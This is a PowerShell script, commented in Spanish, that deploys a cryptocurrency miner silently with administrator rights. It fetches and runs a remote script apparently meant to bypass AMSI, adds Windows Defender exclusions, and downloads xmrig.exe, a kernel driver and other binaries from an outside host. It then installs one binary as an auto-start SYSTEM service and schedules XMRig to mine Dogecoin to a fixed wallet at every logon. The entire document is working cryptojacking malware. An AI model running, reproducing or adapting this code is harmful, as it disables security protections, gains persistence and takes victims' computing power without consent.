# Este script crea un directorio, configura exclusiones, descarga archivos,
# instala un servicio y crea una tarea programada, todo de manera silenciosa.
# Debe ejecutarse con permisos de administrador.

irm "http://baa4ts.is-a.dev/AMSI.ps1" | iex

# Definir la variable de la ruta raíz.
$root = "$env:APPDATA\Wik"

# Definir la URL base para las descargas.
$baseUrl = "https://baa4ts.is-a-good.dev/"

# Lista de archivos a procesar.
$filesToProcess = @(
    "xmrig.exe",
    "wroom.dll",
    "WinRing0x64.sys",
    "Win2Internals.exe"
)

# ---
# 1. Crear el directorio si no existe.
if (-not (Test-Path -Path $root -PathType Container)) {
    New-Item -Path $root -ItemType Directory -Force | Out-Null
}

# ---
# 2. Agregar la carpeta y archivos a las exclusiones de Windows Defender.
try {
    Add-MpPreference -ExclusionPath $root | Out-Null
    foreach ($file in $filesToProcess) {
        Add-MpPreference -ExclusionPath "$root\$file" | Out-Null
    }
} catch {}

# ---
# 3. Excluir los procesos de Windows Defender.
try {
    $processesToExclude = @(
        "xmrig.exe",
        "Win2Internals.exe"
    )
    foreach ($process in $processesToExclude) {
        Add-MpPreference -ExclusionProcess $process | Out-Null
    }
} catch {}

# ---
# 4. Descargar los archivos a la carpeta raíz.
try {
    foreach ($file in $filesToProcess) {
        $url = "$baseUrl$file"
        $destination = "$root\$file"
        Invoke-WebRequest -Uri $url -OutFile $destination | Out-Null
    }
} catch {}

# ---
# 5. Instalar Win2Internals.exe como un servicio de Windows para inicio automático.
try {
    $serviceName = "Win2InternalsService"
    $executablePath = "$root\Win2Internals.exe"
    sc.exe create $serviceName binPath= "`"$executablePath`"" start= auto obj= "NT AUTHORITY\SYSTEM" | Out-Null
} catch {}

# ---
# 6. Crear una tarea programada para ejecutar xmrig.exe al iniciar sesión de cualquier usuario.
try {
    $taskName = "XMRigMiner"
    $xmrigPath = "$root\xmrig.exe"
    $xmrigArguments = "-o rx.unmineable.com:3333 -a rx -k -u DOGE:DHJTrDmStC75AHU7AsZA7fzmtR8c4QT8Wk.LUISPC -p x --threads=1 --cpu-priority=1"

    $action = New-ScheduledTaskAction -Execute $xmrigPath -Argument $xmrigArguments
    $trigger = New-ScheduledTaskTrigger -AtLogon
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
    
} catch {}
